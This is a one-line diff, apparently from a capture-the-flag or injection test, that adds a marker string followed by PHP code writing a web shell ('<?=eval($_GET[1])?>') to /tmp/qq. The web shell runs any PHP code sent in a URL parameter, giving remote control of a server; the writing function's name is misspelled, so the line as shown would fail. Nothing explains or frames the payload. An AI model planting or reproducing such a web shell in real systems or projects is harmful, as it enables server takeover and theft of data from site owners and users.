@@ -1,0 +1,1 @@
+u1f383_in_here<?php file_put_content('/tmp/qq', '<?=eval($_GET[1])?>') ?>
